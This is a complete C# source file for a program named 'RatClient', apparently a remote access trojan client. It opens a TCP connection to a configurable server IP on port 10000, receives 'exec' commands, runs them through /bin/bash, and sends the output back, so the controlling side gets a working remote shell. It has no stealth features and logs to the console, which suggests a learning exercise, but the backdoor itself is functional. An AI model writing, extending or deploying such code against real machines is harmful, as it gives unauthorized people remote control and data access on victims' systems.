using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace RatClient // Uses RatClient.NetworkUtils
{
    public class RatClientApp
    {
        // Default to localhost if not specified. Port must match server.
        private const string ServerIp = "127.0.0.1";
        private const int ServerPort = 10000;

        public static async Task Main(string[] args)
        {
            // Allow overriding server IP via command line argument for flexibility
            string currentServerIp = (args.Length > 0) ? args[0] : ServerIp;
            Console.WriteLine($"RatClient (C#) started. Attempting to connect to {currentServerIp}:{ServerPort}...");

            Socket clientSocket = null;

            try
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                await clientSocket.ConnectAsync(currentServerIp, ServerPort);
                Console.WriteLine($"Connected to server: {clientSocket.RemoteEndPoint}");

                while (clientSocket.Connected)
                {
                    byte[] commandBytes = await NetworkUtils.ReliableReceiveAsync(clientSocket);
                    if (commandBytes == null)
                    {
                        Console.WriteLine("Server disconnected or connection lost while waiting for command.");
                        break;
                    }

                    string command = Encoding.UTF8.GetString(commandBytes).Trim();
                    Console.WriteLine($"Received command: {command}");

                    if (command.ToLowerInvariant() == "exit")
                    {
                        Console.WriteLine("Exit command received. Disconnecting...");
                        break;
                    }
                    else if (command.ToLowerInvariant().StartsWith("exec "))
                    {
                        string processOutput = ExecuteCommand(command.Substring(5)); // Skip "exec "
                        byte[] outputBytes = Encoding.UTF8.GetBytes(processOutput);
                        await NetworkUtils.ReliableSendAsync(clientSocket, outputBytes);
                    }
                    else
                    {
                        string errorMessage = "Unknown command received.";
                        Console.WriteLine(errorMessage);
                        byte[] errorBytes = Encoding.UTF8.GetBytes(errorMessage);
                        await NetworkUtils.ReliableSendAsync(clientSocket, errorBytes);
                    }
                }
            }
            catch (SocketException ex)
            {
                Console.WriteLine($"SocketException in Client: {ex.Message} (Error Code: {ex.SocketErrorCode})");
                if (ex.SocketErrorCode == SocketError.ConnectionRefused)
                {
                    Console.WriteLine($"Connection to {currentServerIp}:{ServerPort} refused. Ensure server is running.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An unexpected error occurred in Client: {ex.Message}\nStackTrace: {ex.StackTrace}");
            }
            finally
            {
                Console.WriteLine("Shutting down client resources...");
                if (clientSocket != null)
                {
                    if (clientSocket.Connected)
                    {
                         try
                        {
                            clientSocket.Shutdown(SocketShutdown.Both);
                        }
                        catch (SocketException se) { Console.WriteLine($"SocketException during client socket shutdown: {se.Message}"); }
                        catch (ObjectDisposedException) { /* Socket already closed, ignore */ }
                    }
                    clientSocket.Close();
                }
                Console.WriteLine("RatClient has disconnected.");
            }
        }

        private static string ExecuteCommand(string commandToExecute)
        {
            Console.WriteLine($"Executing command: {commandToExecute}");
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo
                {
                    FileName = "/bin/bash", // Or "cmd.exe" on Windows, make platform-dependent for wider use
                    Arguments = $"-c \"{commandToExecute.Replace("\"", "\\\"")}\"", // Escape quotes in command
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(processInfo))
                {
                    if (process == null)
                    {
                        return "Error: Could not start process.";
                    }
                    // Consider adding a timeout for process.WaitForExit
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit(); // Ensure process has finished before reading exit code

                    if (process.ExitCode != 0 && string.IsNullOrEmpty(output) && !string.IsNullOrEmpty(error))
                    {
                        return $"Error (Exit Code {process.ExitCode}):\n{error}";
                    }
                    if (!string.IsNullOrEmpty(error) && string.IsNullOrEmpty(output)) // If only error output
                    {
                         return $"Command output (possibly error stream):\n{error}";
                    }
                     if (!string.IsNullOrEmpty(error) && !string.IsNullOrEmpty(output)) // If both, append error
                    {
                        return $"Output:\n{output}\nError Stream (if any):\n{error}";
                    }
                    return string.IsNullOrEmpty(output) ? "[No output]" : output;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception during command execution: {ex.Message}");
                return $"Exception during command execution: {ex.ToString()}";
            }
        }
    }
}
